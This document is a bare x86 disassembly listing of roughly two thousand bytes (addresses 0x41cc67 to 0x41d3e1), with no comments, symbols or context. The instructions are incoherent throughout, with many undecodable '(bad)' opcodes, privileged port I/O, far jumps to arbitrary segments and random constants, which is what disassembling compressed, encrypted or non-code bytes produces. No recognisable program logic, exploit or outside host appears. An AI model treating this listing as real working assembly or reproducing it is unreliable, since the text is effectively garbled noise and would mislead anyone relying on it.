  41cc67:	aaa    
  41cc68:	pushf  
  41cc69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc6a:	sub    bh,BYTE PTR [esi+0x3c9c22cf]
  41cc70:	mov    edi,0x36c68942
  41cc75:	and    ah,BYTE PTR [esi+eax*2+0x48e0f49a]
  41cc7c:	shl    BYTE PTR [ebx+0x61],1
  41cc7f:	add    DWORD PTR [ebp-0x25],ecx
  41cc82:	or     esp,esp
  41cc84:	xor    dl,BYTE PTR [edx+ebx*4]
  41cc87:	mov    ch,0xe4
  41cc89:	sbb    eax,0xb51cb598
  41cc8e:	fidivr DWORD PTR [edi-0x425d168d]
  41cc94:	add    BYTE PTR [ebx+0x3a],bl
  41cc97:	sahf   
  41cc98:	jecxz  0x41cd03
  41cc9a:	fidiv  WORD PTR [ebp-0x6ed0aa80]
  41cca0:	push   edi
  41cca1:	rcr    BYTE PTR [ebx+eax*2],cl
  41cca4:	test   DWORD PTR [edx],eax
  41cca6:	fsub   DWORD PTR [eax+0x746f8dce]
  41ccac:	adc    edx,edx
  41ccae:	cwde   
  41ccaf:	add    BYTE PTR [edi-0x6e14bf6a],0x14
  41ccb6:	je     0x41cc8d
  41ccb8:	jecxz  0x41ccc9
  41ccba:	rcl    ah,0xc1
  41ccbd:	mov    dh,0x6c
  41ccbf:	jae    0x41cd1f
  41ccc1:	sbb    al,0xc6
  41ccc3:	jl     0x41cc7c
  41ccc5:	fwait
  41ccc6:	mov    edi,0x2ab6bffa
  41cccb:	or     al,0xf3
  41cccd:	xchg   ebp,eax
  41ccce:	cdq    
  41cccf:	cli    
  41ccd0:	jb     0x41cd4b
  41ccd2:	mov    eax,ds:0xa0999f3d
  41ccd7:	idiv   ebp
  41ccd9:	mov    ds:0xcb0cb983,eax
  41ccde:	pop    ss
  41ccdf:	call   0x32b5:0x2c9782c4
  41cce6:	or     edi,edi
  41cce8:	cmp    al,0xf4
  41ccea:	cwde   
  41cceb:	data16 mov bh,0xe9
  41ccee:	lods   eax,DWORD PTR ds:[esi]
  41ccef:	or     DWORD PTR [eax],edi
  41ccf1:	lods   eax,DWORD PTR ds:[esi]
  41ccf2:	jmp    0xb172cb59
  41ccf7:	pop    edx
  41ccf8:	lahf   
  41ccf9:	xor    BYTE PTR [esi+0x6c1d1915],ah
  41ccff:	jecxz  0x41cd2b
  41cd01:	or     ebx,ebx
  41cd03:	pop    ds
  41cd04:	hlt    
  41cd05:	jl     0x41cd2a
  41cd07:	add    ebx,DWORD PTR [edi]
  41cd09:	and    BYTE PTR [ecx+0x57],dh
  41cd0c:	jle    0x41cd80
  41cd0e:	cmp    ecx,ebx
  41cd10:	sbb    al,0x22
  41cd12:	dec    eax
  41cd13:	push   edi
  41cd14:	shl    ebx,1
  41cd16:	ja     0x41cc9c
  41cd18:	sar    DWORD PTR [ebx],1
  41cd1a:	inc    eax
  41cd1b:	scas   al,BYTE PTR es:[edi]
  41cd1c:	inc    edx
  41cd1d:	nop
  41cd1e:	mov    dh,0xea
  41cd20:	lock inc ebx
  41cd22:	scas   eax,DWORD PTR es:[edi]
  41cd23:	sahf   
  41cd24:	lahf   
  41cd25:	add    eax,0x5a65966b
  41cd2a:	and    DWORD PTR [edx],eax
  41cd2c:	fcom   QWORD PTR [eax]
  41cd2e:	mov    ds:0xc8c53c0f,eax
  41cd33:	loope  0x41cd77
  41cd35:	jmp    0x99b8:0xc9aae2c2
  41cd3c:	jae    0x41cd4f
  41cd3e:	or     BYTE PTR [edx-0x1f],bl
  41cd41:	push   0x67
  41cd43:	ds fwait
  41cd45:	and    al,0xb
  41cd47:	mov    cl,0x41
  41cd49:	ror    BYTE PTR [esi+0x30736de4],1
  41cd4f:	lods   al,BYTE PTR ds:[esi]
  41cd50:	xchg   DWORD PTR [si+0x6449],ecx
  41cd55:	imul   edx,DWORD PTR [edi-0x3e6eb7cf],0x8d63411e
  41cd5f:	or     al,bh
  41cd61:	xor    al,0xf4
  41cd63:	cdq    
  41cd64:	inc    ebx
  41cd65:	xor    bh,BYTE PTR [ebx]
  41cd67:	and    eax,0x63e183c3
  41cd6c:	loopne 0x41cd1f
  41cd6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd6f:	test   DWORD PTR [esi],ebp
  41cd71:	(bad)  
  41cd72:	adc    eax,0x374fc7f0
  41cd77:	mov    BYTE PTR [ebx-0x5e2b49c0],bh
  41cd7d:	jno    0x41cd12
  41cd7f:	mov    ecx,0xf39984d3
  41cd84:	loop   0x41cdd6
  41cd86:	in     eax,0x1
  41cd88:	(bad)  
  41cd89:	cmp    cl,dh
  41cd8b:	test   eax,0x74cb1879
  41cd90:	sub    DWORD PTR [ecx-0x23d3ecba],eax
  41cd96:	or     eax,DWORD PTR [eax+0x81ec96c]
  41cd9c:	dec    ebx
  41cd9d:	inc    edx
  41cd9e:	push   0xffffffa5
  41cda0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cda1:	ret    
  41cda2:	add    eax,0x94d2009a
  41cda7:	xor    eax,0x1f3ff7e6
  41cdac:	cmp    eax,0xc9c3716a
  41cdb1:	jnp    0x41cdc9
  41cdb3:	addr16 inc ecx
  41cdb5:	mov    ds:0xb38829b3,eax
  41cdba:	jmp    0x41cda0
  41cdbc:	sub    eax,0xeaba2d77
  41cdc1:	jmp    0x6362d0c7
  41cdc6:	or     al,dl
  41cdc8:	add    BYTE PTR [ebx-0x74],0x89
  41cdcc:	pop    esi
  41cdcd:	jb     0x41ce0d
  41cdcf:	pop    edi
  41cdd0:	xchg   esi,eax
  41cdd1:	pop    ecx
  41cdd2:	aas    
  41cdd3:	std    
  41cdd4:	lahf   
  41cdd5:	hlt    
  41cdd6:	cmp    eax,0x746377da
  41cddb:	jge    0x41cd88
  41cddd:	fsub   st(7),st
  41cddf:	pop    eax
  41cde0:	nop
  41cde1:	out    dx,eax
  41cde2:	push   ss
  41cde3:	sub    bh,BYTE PTR [eax+edi*1-0x3527b25a]
  41cdea:	dec    edi
  41cdeb:	pop    edx
  41cdec:	addr16 aam 0x64
  41cdef:	out    0xb,eax
  41cdf1:	scas   al,BYTE PTR es:[edi]
  41cdf2:	test   al,0x4
  41cdf4:	out    dx,eax
  41cdf5:	retf   0x729f
  41cdf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdf9:	jne    0x41cd93
  41cdfb:	(bad)  
  41cdfc:	ins    DWORD PTR es:[edi],dx
  41cdfd:	fwait
  41cdfe:	push   0xffffffb4
  41ce00:	inc    ebx
  41ce01:	loopne 0x41ce3a
  41ce03:	neg    edi
  41ce05:	mov    cl,0xf0
  41ce07:	jmp    0x744a:0xfdb0b69e
  41ce0e:	inc    edx
  41ce0f:	fcom   QWORD PTR [eax-0x11]
  41ce12:	mov    ebp,0x51b47030
  41ce17:	stos   BYTE PTR es:[edi],al
  41ce18:	iret   
  41ce19:	ss test bh,dl
  41ce1c:	jmp    0xf38f:0x9c641159
  41ce23:	sub    dl,ah
  41ce25:	sbb    dl,BYTE PTR [ecx+0x6d0950b9]
  41ce2b:	not    BYTE PTR [esi+0x50672e70]
  41ce31:	xchg   esi,eax
  41ce32:	jmp    0xd0d89011
  41ce37:	jbe    0x41cdca
  41ce39:	das    
  41ce3a:	xlat   BYTE PTR ds:[ebx]
  41ce3b:	push   es
  41ce3c:	loopne 0x41ce3d
  41ce3e:	pop    esi
  41ce3f:	push   0x9af05d21
  41ce44:	jp     0x41cdce
  41ce46:	outs   dx,BYTE PTR ds:[esi]
  41ce47:	js     0x41ce48
  41ce49:	pop    ds
  41ce4a:	stos   DWORD PTR es:[edi],eax
  41ce4b:	inc    ebx
  41ce4c:	fmulp  st(2),st
  41ce4e:	call   0xbccb3ac0
  41ce53:	mov    esi,0x3d486cfe
  41ce58:	push   es
  41ce59:	mov    bh,0xb9
  41ce5b:	sub    dh,BYTE PTR [edx+0x5]
  41ce5e:	adc    BYTE PTR [eax-0x1d],ah
  41ce61:	aaa    
  41ce62:	test   eax,0xd40cae2
  41ce67:	stc    
  41ce68:	int    0x4d
  41ce6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce6b:	repnz pop eax
  41ce6d:	fst    DWORD PTR [edx+eax*1]
  41ce70:	inc    eax
  41ce71:	retf   0x5398
  41ce74:	adc    dl,ah
  41ce76:	push   ds
  41ce77:	jno    0x41cea0
  41ce79:	retf   0x9dbd
  41ce7c:	sbb    eax,0x8aee9150
  41ce81:	cmc    
  41ce82:	jae    0x41cea5
  41ce84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce85:	xchg   BYTE PTR [eax-0x7d91f220],cl
  41ce8b:	push   ebx
  41ce8c:	sar    DWORD PTR ds:0xefc01afb,cl
  41ce92:	stos   DWORD PTR es:[edi],eax
  41ce93:	inc    edx
  41ce94:	jle    0x41ce58
  41ce96:	retf   
  41ce97:	sbb    ah,BYTE PTR [eax-0x26e5cd88]
  41ce9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce9e:	mov    ebp,0xe87a2439
  41cea3:	shl    DWORD PTR [ecx],cl
  41cea5:	or     ah,0xbc
  41cea8:	std    
  41cea9:	fisttp QWORD PTR [eax+0x79]
  41ceac:	repz cmp eax,DWORD PTR [ecx+0x28]
  41ceb0:	(bad)  
  41ceb1:	bound  ecx,QWORD PTR [esi]
  41ceb3:	jmp    0x28faeb7c
  41ceb8:	sub    edx,DWORD PTR [ebx-0x6b124b1d]
  41cebe:	pop    esi
  41cebf:	jmp    0x639:0xb75de7af
  41cec6:	repnz and DWORD PTR [ebx+ecx*8-0x20],0x5a
  41cecc:	jne    0x41cef2
  41cece:	mov    eax,0x39428abb
  41ced3:	jbe    0x41ce57
  41ced5:	inc    edx
  41ced6:	cmc    
  41ced7:	call   DWORD PTR [esi+0x5250cabb]
  41cedd:	stos   DWORD PTR es:[edi],eax
  41cede:	and    DWORD PTR [edx-0x375da96d],0x1486c3e3
  41cee8:	inc    esp
  41cee9:	repz test BYTE PTR [esi],cl
  41ceec:	mov    ebp,0x162ae88b
  41cef1:	bound  edx,QWORD PTR [edx]
  41cef3:	or     esi,edx
  41cef5:	push   ecx
  41cef6:	xor    esi,DWORD PTR [eax-0x5d5f5002]
  41cefc:	lea    ecx,[esi-0x69396934]
  41cf02:	loop   0x41cec2
  41cf04:	pop    esi
  41cf05:	xchg   BYTE PTR [esi-0x7c4e8785],ah
  41cf0b:	inc    esp
  41cf0c:	ficom  WORD PTR [ecx]
  41cf0e:	fs aas 
  41cf10:	(bad)  
  41cf11:	sbb    BYTE PTR [ebx-0x5202b521],al
  41cf17:	hlt    
  41cf18:	popa   
  41cf19:	add    cl,BYTE PTR [edx-0x24]
  41cf1c:	jne    0x41cf3f
  41cf1e:	sbb    al,0x77
  41cf20:	fild   WORD PTR [ecx-0x5445db6f]
  41cf26:	fadd   st(4),st
  41cf28:	mov    al,fs:0x3f8d2a49
  41cf2e:	int3   
  41cf2f:	out    dx,al
  41cf30:	out    0x91,eax
  41cf32:	outs   dx,BYTE PTR ds:[esi]
  41cf33:	push   ebx
  41cf34:	or     edi,edx
  41cf36:	(bad)  
  41cf37:	lods   eax,DWORD PTR ds:[esi]
  41cf38:	rcl    ecx,0x8b
  41cf3b:	stc    
  41cf3c:	cwde   
  41cf3d:	or     eax,0x35322444
  41cf42:	je     0x41cf69
  41cf44:	jns    0x41cf20
  41cf46:	int3   
  41cf47:	sub    al,0x8
  41cf49:	aam    0xdc
  41cf4b:	fild   DWORD PTR [edi-0x38]
  41cf4e:	out    dx,eax
  41cf4f:	aas    
  41cf50:	mov    esi,0x65767b39
  41cf55:	jp     0x41cfaf
  41cf57:	pushf  
  41cf58:	and    al,0x54
  41cf5a:	add    eax,0x11831ea2
  41cf5f:	xchg   DWORD PTR [edx+ebp*1],eax
  41cf62:	pop    eax
  41cf63:	arpl   WORD PTR [ecx+0x22],cx
  41cf66:	push   es
  41cf67:	lea    edx,[ecx+0x52]
  41cf6a:	xor    eax,0x5ed48020
  41cf6f:	(bad)  [ebx-0x36]
  41cf72:	(bad)  
  41cf73:	jno    0x41cf7f
  41cf75:	or     eax,0xc5906f6b
  41cf7a:	inc    edi
  41cf7b:	ss call 0x51f0:0xabc9c8b3
  41cf83:	or     eax,0xc3208452
  41cf88:	push   edx
  41cf89:	imul   esp,DWORD PTR [ebx],0xffffffe0
  41cf8c:	jbe    0x41cf6b
  41cf8e:	sub    DWORD PTR [eax],ecx
  41cf90:	int3   
  41cf91:	and    ecx,ecx
  41cf93:	xor    eax,DWORD PTR [edi+0x4b]
  41cf96:	ins    BYTE PTR es:[edi],dx
  41cf97:	inc    esi
  41cf98:	div    cl
  41cf9a:	in     eax,dx
  41cf9b:	in     eax,dx
  41cf9c:	aad    0x9e
  41cf9e:	mov    ebx,edi
  41cfa0:	mov    edi,0xa0129140
  41cfa5:	adc    edx,DWORD PTR [eax+edx*4+0x52013eca]
  41cfac:	clc    
  41cfad:	add    BYTE PTR [eax],al
  41cfaf:	add    BYTE PTR [eax],al
  41cfb1:	add    BYTE PTR [ebx-0x37],bh
  41cfb4:	xor    bh,0xb2
  41cfb7:	(bad)  
  41cfb8:	jg     0x41cf87
  41cfba:	sbb    DWORD PTR [esp+esi*1-0x5b],0x65de1839
  41cfc2:	inc    ecx
  41cfc3:	dec    ebx
  41cfc4:	add    DWORD PTR [eax],eax
  41cfc6:	repz add al,0x0
  41cfc9:	add    BYTE PTR [ecx+0xaa20285],bh
  41cfcf:	iret   
  41cfd0:	fnstenv [edi+0x55]
  41cfd3:	inc    esp
  41cfd4:	daa    
  41cfd5:	cdq    
  41cfd6:	xchg   ebp,eax
  41cfd7:	mov    cl,0x3b
  41cfd9:	ret    0x75bb
  41cfdc:	aam    0x11
  41cfde:	push   edx
  41cfdf:	xchg   DWORD PTR [esi-0x70],esi
  41cfe2:	mov    eax,0x6f508517
  41cfe7:	pop    ecx
  41cfe8:	aad    0xc1
  41cfea:	ss jb  0x41cf7f
  41cfed:	outs   dx,DWORD PTR ds:[esi]
  41cfee:	mov    eax,0xd265fb77
  41cff3:	and    dl,BYTE PTR [ebp+0x3c1d8e84]
  41cff9:	mov    esp,0xfc680018
  41cffe:	ret    
  41cfff:	out    0x82,al
  41d001:	push   ds
  41d002:	or     DWORD PTR [ebx-0x80],ecx
  41d005:	mov    esp,esi
  41d007:	pop    ecx
  41d008:	cmp    DWORD PTR [edi],esp
  41d00a:	xchg   ecx,edi
  41d00c:	mov    esp,0xdaa8ff45
  41d011:	xlat   BYTE PTR ds:[ebx]
  41d012:	call   0x7943:0xc5f371f7
  41d019:	in     al,0xfd
  41d01b:	add    BYTE PTR [edx-0x616dd37d],dl
  41d021:	jnp    0x41d010
  41d023:	fwait
  41d024:	neg    BYTE PTR [edx-0x72]
  41d027:	xchg   esi,eax
  41d028:	or     DWORD PTR [ebp-0x73286649],esi
  41d02e:	lock pop edx
  41d030:	add    BYTE PTR [ebx-0x3d],dl
  41d033:	not    DWORD PTR [edx-0xa]
  41d036:	pushf  
  41d037:	inc    ebp
  41d038:	pushf  
  41d039:	shl    DWORD PTR [esi+eiz*1-0x6d],cl
  41d03d:	push   esp
  41d03e:	push   ss
  41d03f:	add    edx,0x9a49b6a4
  41d045:	dec    ebp
  41d046:	fs leave 
  41d048:	mov    bl,0x31
  41d04a:	cdq    
  41d04b:	jnp    0x41d02b
  41d04d:	adc    al,0x7b
  41d04f:	lock dec edx
  41d051:	mov    ebx,DWORD PTR [eax]
  41d053:	cld    
  41d054:	jecxz  0x41cfdc
  41d056:	(bad)  
  41d057:	(bad)  
  41d058:	stc    
  41d059:	cmp    BYTE PTR [ecx+0x3c],dh
  41d05c:	or     DWORD PTR [ecx+0xc9a4b14],ebp
  41d062:	fnstsw WORD PTR [eax-0x49]
  41d065:	out    0x9,al
  41d067:	or     al,0x1c
  41d069:	popa   
  41d06a:	lock dec ecx
  41d06c:	add    DWORD PTR [ebx],ebx
  41d06e:	push   cs
  41d06f:	arpl   WORD PTR [ebp+ebp*1-0x64],bx
  41d073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d074:	retf   0x606c
  41d077:	sub    esp,DWORD PTR [edi-0x5c827c49]
  41d07d:	cli    
  41d07e:	fwait
  41d07f:	sbb    dl,BYTE PTR [ebx+0x72]
  41d082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d083:	frstor [edx]
  41d085:	xchg   bl,ch
  41d087:	cmp    al,0xd6
  41d089:	and    esi,DWORD PTR [edx+0x52]
  41d08c:	xor    BYTE PTR [edi-0x1e167e37],al
  41d092:	aam    0xd9
  41d094:	cli    
  41d095:	inc    ecx
  41d096:	stos   DWORD PTR es:[edi],eax
  41d097:	pushf  
  41d098:	aad    0x2e
  41d09a:	cmp    al,BYTE PTR [esi-0x48d93000]
  41d0a0:	shl    BYTE PTR [ebx+ecx*8],1
  41d0a3:	loop   0x41d113
  41d0a5:	or     ah,BYTE PTR [edi+0x76cc8baf]
  41d0ab:	stos   BYTE PTR es:[edi],al
  41d0ac:	mov    ch,0x45
  41d0ae:	int    0x36
  41d0b0:	leave  
  41d0b1:	and    esp,ebp
  41d0b3:	mov    eax,ds:0x9e5d7e65
  41d0b8:	or     DWORD PTR [eax+edx*8],0x3200076f
  41d0bf:	rcl    DWORD PTR ds:0xc1d2de,cl
  41d0c5:	out    0x86,eax
  41d0c7:	ja     0x41d144
  41d0c9:	xchg   ebp,eax
  41d0ca:	push   ecx
  41d0cb:	and    dh,BYTE PTR [edx-0x4ee3a5e9]
  41d0d1:	inc    edx
  41d0d2:	stos   BYTE PTR es:[edi],al
  41d0d3:	cwde   
  41d0d4:	push   ebp
  41d0d5:	mov    BYTE PTR [edx+0x461c8f42],dl
  41d0db:	pop    es
  41d0dc:	mov    ds:0x94fdeaf2,al
  41d0e1:	adc    DWORD PTR [ebp-0xbe12a31],ebp
  41d0e7:	mov    bh,0x9a
  41d0e9:	mov    eax,ds:0xefb0e29a
  41d0ee:	sbb    BYTE PTR [ebx],bh
  41d0f0:	mov    esi,0x6cde80eb
  41d0f5:	dec    esi
  41d0f6:	mov    edi,0xcd888b37
  41d0fb:	js     0x41d0b0
  41d0fd:	fcom   st(6)
  41d0ff:	pop    edi
  41d100:	xor    DWORD PTR [ebx-0x7],esp
  41d103:	lock repz out dx,al
  41d106:	mov    dl,0x13
  41d108:	xchg   edx,eax
  41d109:	mov    ebp,0x92020679
  41d10e:	(bad)  
  41d10f:	mov    esi,0x596370b9
  41d114:	(bad)  
  41d115:	out    dx,al
  41d116:	mov    ch,0xbe
  41d118:	bndstx [ebp+edi*4-0x13f310af],bnd0
  41d120:	arpl   cx,sp
  41d122:	(bad)  
  41d123:	fisub  DWORD PTR [edx]
  41d125:	pusha  
  41d126:	pushf  
  41d127:	mov    al,ds:0x7d3e7bf8
  41d12c:	test   BYTE PTR [ebp-0x29],bl
  41d12f:	sub    bl,BYTE PTR [edi-0x32226b07]
  41d135:	mov    BYTE PTR [esi+0x48],dh
  41d138:	mov    dh,0xd1
  41d13a:	ret    0x9b2f
  41d13d:	push   ss
  41d13e:	dec    edx
  41d13f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41d141:	clc    
  41d142:	sub    BYTE PTR [esi],0x5b
  41d145:	shl    DWORD PTR [edx-0x1f701828],1
  41d14b:	shl    al,cl
  41d14d:	cdq    
  41d14e:	pop    ss
  41d14f:	aad    0x68
  41d151:	adc    al,0x28
  41d153:	xchg   ebp,eax
  41d154:	cdq    
  41d155:	jbe    0x41d125
  41d157:	push   esi
  41d158:	mov    eax,ds:0x85f7c8a1
  41d15d:	jbe    0x41d158
  41d15f:	and    dl,bh
  41d161:	jae    0x41d151
  41d163:	and    eax,0x422d40b7
  41d168:	sbb    eax,DWORD PTR [esi]
  41d16a:	test   al,0xf0
  41d16c:	or     dh,BYTE PTR [edi+0x3b]
  41d16f:	adc    DWORD PTR [esi-0x47],edx
  41d172:	cmp    eax,0xa2136aed
  41d177:	icebp  
  41d178:	jbe    0x41d1ec
  41d17a:	dec    esp
  41d17b:	or     eax,0x8c924dc1
  41d180:	mov    esp,0xca1d369a
  41d185:	shr    DWORD PTR [ebx+edi*2],1
  41d188:	sbb    eax,0xa872c1ff
  41d18d:	bound  edx,QWORD PTR [esi+0x262ddbb0]
  41d193:	mov    bl,0x3d
  41d195:	nop
  41d196:	inc    eax
  41d197:	in     eax,dx
  41d198:	popa   
  41d199:	scas   al,BYTE PTR es:[edi]
  41d19a:	adc    DWORD PTR [edx+eiz*2-0x1598aaf8],0xffffffe9
  41d1a2:	mov    ax,0x2031
  41d1a6:	retf   0xf1a7
  41d1a9:	sub    ebx,DWORD PTR [eax+0x17]
  41d1ac:	xchg   edx,eax
  41d1ad:	or     eax,ebx
  41d1af:	mov    WORD PTR [esi],?
  41d1b1:	stos   BYTE PTR es:[edi],al
  41d1b2:	xchg   ebx,eax
  41d1b3:	retf   0x232d
  41d1b6:	sub    al,0x19
  41d1b8:	pop    ebp
  41d1b9:	out    dx,eax
  41d1ba:	imul   esp,DWORD PTR [edi+0x19415062],0x45
  41d1c1:	js     0x41d1e5
  41d1c3:	addr16 cdq 
  41d1c5:	and    esp,0xffffffc8
  41d1c8:	std    
  41d1c9:	rol    BYTE PTR [esi-0x33726ee6],1
  41d1cf:	test   al,0xae
  41d1d1:	data16 sub cl,BYTE PTR [edi+0x9]
  41d1d5:	fldln2 
  41d1d7:	mov    eax,es
  41d1d9:	jns    0x41d257
  41d1db:	mov    dh,0x16
  41d1dd:	cwde   
  41d1de:	stc    
  41d1df:	cld    
  41d1e0:	dec    eax
  41d1e1:	popf   
  41d1e2:	shl    DWORD PTR [ecx+eax*4-0x31],cl
  41d1e6:	sub    eax,0xb42b25e1
  41d1eb:	mov    esi,0xe53da663
  41d1f0:	scas   eax,DWORD PTR es:[edi]
  41d1f1:	ja     0x41d1c4
  41d1f3:	jbe    0x41d24b
  41d1f5:	sbb    DWORD PTR cs:[edx],0x42b579cd
  41d1fc:	ror    dh,1
  41d1fe:	sar    BYTE PTR [esi+0x67],1
  41d201:	test   BYTE PTR [ebx-0x5cd6e157],ah
  41d207:	std    
  41d208:	sbb    eax,0x38c65061
  41d20d:	or     al,0x81
  41d20f:	push   edx
  41d210:	sbb    ebx,esi
  41d212:	inc    ebp
  41d213:	call   0x1a587422
  41d218:	xchg   DWORD PTR [esi],edi
  41d21a:	xor    eax,DWORD PTR [ebx*1-0xd96115d]
  41d221:	loopne 0x41d213
  41d223:	jl     0x41d29b
  41d225:	jbe    0x41d228
  41d227:	jo     0x41d296
  41d229:	(bad)  
  41d22a:	cli    
  41d22b:	cmp    BYTE PTR [ebx-0x15],dh
  41d22e:	hlt    
  41d22f:	xchg   esi,eax
  41d230:	dec    ecx
  41d231:	push   ebx
  41d232:	cmp    dh,0x63
  41d235:	inc    ecx
  41d236:	xor    DWORD PTR [eax],ebp
  41d238:	retf   0x8fd6
  41d23b:	test   eax,0x5ac525b9
  41d240:	repz mov al,BYTE PTR [edx+0x79]
  41d244:	cwde   
  41d245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d246:	je     0x41d24e
  41d248:	xchg   esi,eax
  41d249:	into   
  41d24a:	mov    dl,0xff
  41d24c:	xchg   esp,eax
  41d24d:	icebp  
  41d24e:	cmp    ch,ah
  41d250:	int3   
  41d251:	mov    ah,0xce
  41d253:	adc    bl,ch
  41d255:	(bad)  [ecx+0x729af85]
  41d25b:	iret   
  41d25c:	int3   
  41d25d:	(bad)  
  41d25e:	(bad)  
  41d25f:	fnstcw WORD PTR [edi-0x11ea0109]
  41d265:	xor    BYTE PTR ds:0xd1c1bbd4,dl
  41d26b:	jo     0x41d222
  41d26d:	pop    ss
  41d26e:	out    dx,al
  41d26f:	cmp    BYTE PTR [edi+0x3c],0xe9
  41d273:	mov    ah,0xb8
  41d275:	popa   
  41d276:	(bad)  
  41d277:	int    0x69
  41d279:	jns    0x41d22b
  41d27b:	aad    0x3b
  41d27d:	aas    
  41d27e:	leave  
  41d27f:	pop    ebx
  41d280:	mov    al,0x9b
  41d282:	addr16 add ecx,esp
  41d285:	mov    ebp,DWORD PTR [edx-0x6c]
  41d288:	loope  0x41d2f6
  41d28a:	into   
  41d28b:	data16 test al,0x66
  41d28e:	into   
  41d28f:	dec    edx
  41d290:	cmp    al,0x53
  41d292:	jae    0x41d284
  41d294:	xchg   edx,eax
  41d295:	ss push ebx
  41d297:	xchg   edi,eax
  41d298:	sub    DWORD PTR ss:[ecx],ebx
  41d29b:	mov    al,ds:0x35b2d848
  41d2a0:	ret    0xafce
  41d2a3:	xlat   BYTE PTR ds:[ebx]
  41d2a4:	mov    ch,0x70
  41d2a6:	cdq    
  41d2a7:	retf   0x5b4d
  41d2aa:	add    BYTE PTR [esp+edi*2-0x55979be3],ah
  41d2b1:	nop
  41d2b2:	in     eax,0xb7
  41d2b4:	and    eax,0x5c2c7525
  41d2b9:	add    BYTE PTR [eax-0x2c2faf],bl
  41d2bf:	retf   
  41d2c0:	adc    BYTE PTR [edx],cl
  41d2c2:	mov    dh,0x25
  41d2c4:	jb     0x41d2e5
  41d2c6:	and    DWORD PTR [edi-0x54dd7489],ebx
  41d2cc:	xchg   ebx,eax
  41d2cd:	xchg   edi,eax
  41d2ce:	sbb    dl,cl
  41d2d0:	sub    eax,0xccb4a599
  41d2d5:	pushf  
  41d2d6:	mov    eax,DWORD PTR [ebx+eax*2+0x6099cff]
  41d2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2de:	xor    eax,0xad2d8808
  41d2e3:	in     eax,dx
  41d2e4:	dec    ebx
  41d2e5:	mov    ecx,0x5f1f93b8
  41d2ea:	pop    ecx
  41d2eb:	lods   eax,DWORD PTR ds:[esi]
  41d2ec:	loope  0x41d36b
  41d2ee:	rcr    BYTE PTR [ebp+0x7f66cb6c],cl
  41d2f4:	adc    ecx,0xb64f9613
  41d2fa:	sbb    al,0x91
  41d2fc:	gs jge 0x41d323
  41d2ff:	pop    ecx
  41d300:	loop   0x41d30e
  41d302:	adc    eax,0x91aedf38
  41d307:	push   ss
  41d308:	jbe    0x41d2d4
  41d30a:	div    BYTE PTR [esp+eiz*4+0x48]
  41d30e:	icebp  
  41d30f:	aad    0x94
  41d311:	xor    al,0xfd
  41d313:	or     ebx,DWORD PTR [edi]
  41d315:	adc    ebp,edi
  41d317:	aaa    
  41d318:	pop    ds
  41d319:	inc    edx
  41d31a:	pop    ds
  41d31b:	adc    BYTE PTR [ebp+edi*4-0x2afccc21],bl
  41d322:	cmp    al,0x66
  41d324:	ss jp  0x41d389
  41d327:	loopne 0x41d394
  41d329:	pusha  
  41d32a:	add    ebx,DWORD PTR [edx-0x11a50c46]
  41d330:	mov    edx,edx
  41d332:	in     al,0x31
  41d334:	ins    BYTE PTR es:[edi],dx
  41d335:	inc    ebp
  41d336:	xor    al,0x6b
  41d338:	nop
  41d339:	sbb    al,al
  41d33b:	jmp    0x41d36b
  41d33d:	mov    ds:0xdaefe769,eax
  41d342:	outs   dx,BYTE PTR ds:[esi]
  41d343:	lods   al,BYTE PTR ds:[esi]
  41d344:	ret    0xcdac
  41d347:	dec    ebp
  41d348:	outs   dx,BYTE PTR ds:[esi]
  41d349:	fadd   st(5),st
  41d34b:	les    ecx,FWORD PTR [esi]
  41d34d:	jb     0x41d30d
  41d34f:	dec    esi
  41d350:	sbb    al,0xf9
  41d352:	pusha  
  41d353:	fldcw  WORD PTR [ebp+0x45]
  41d356:	and    cl,BYTE PTR [ecx+ebx*1]
  41d359:	pop    edx
  41d35a:	adc    BYTE PTR [edi+0x4a4ae7d5],bh
  41d360:	mov    bl,0x6d
  41d362:	(bad)  
  41d363:	stos   BYTE PTR es:[edi],al
  41d364:	mov    cl,0xc9
  41d366:	sub    DWORD PTR [ecx+0x17],ebp
  41d369:	inc    ecx
  41d36a:	js     0x41d3db
  41d36c:	add    esi,DWORD PTR [esi]
  41d36e:	lods   al,BYTE PTR ds:[esi]
  41d36f:	mov    bh,0x70
  41d371:	rcl    DWORD PTR [ebp+0x1f],1
  41d374:	push   ecx
  41d375:	imul   ebx,ecx,0xffffff82
  41d378:	jecxz  0x41d316
  41d37a:	add    dl,BYTE PTR ds:0x20da2551
  41d380:	sbb    dh,BYTE PTR [ebp+eiz*8-0x3834438a]
  41d387:	clc    
  41d388:	push   0x20
  41d38a:	nop
  41d38b:	loope  0x41d32b
  41d38d:	fidiv  DWORD PTR [eax+0x19603e67]
  41d393:	xchg   ecx,eax
  41d394:	cmp    eax,0x8ec464c5
  41d399:	jmp    0x41d390
  41d39b:	pop    ecx
  41d39c:	js     0x41d3c0
  41d39e:	sub    ch,BYTE PTR [edi]
  41d3a0:	mov    ds:0x989fb133,eax
  41d3a5:	jge    0x41d3f4
  41d3a7:	je     0x41d3e4
  41d3a9:	outs   dx,DWORD PTR ds:[esi]
  41d3aa:	(bad)
  41d3ad:	ins    DWORD PTR es:[edi],dx
  41d3ae:	out    dx,eax
  41d3af:	cmp    eax,0x9b400c7
  41d3b4:	mov    dl,0x99
  41d3b6:	dec    ebx
  41d3b7:	mov    ds:0x5340bc0b,al
  41d3bc:	or     BYTE PTR [ecx],0x2
  41d3bf:	out    dx,eax
  41d3c0:	and    DWORD PTR [esi-0x10435788],esp
  41d3c6:	jmp    0xa70bb0ce
  41d3cb:	and    DWORD PTR [edi-0x2864c4ad],ecx
  41d3d1:	je     0x41d410
  41d3d3:	nop
  41d3d4:	adc    BYTE PTR [ebx+edi*2-0x27f6e970],al
  41d3db:	fldcw  WORD PTR [ecx+0x300b10e6]
  41d3e1:	mov    eax,ds:0x9f32581b
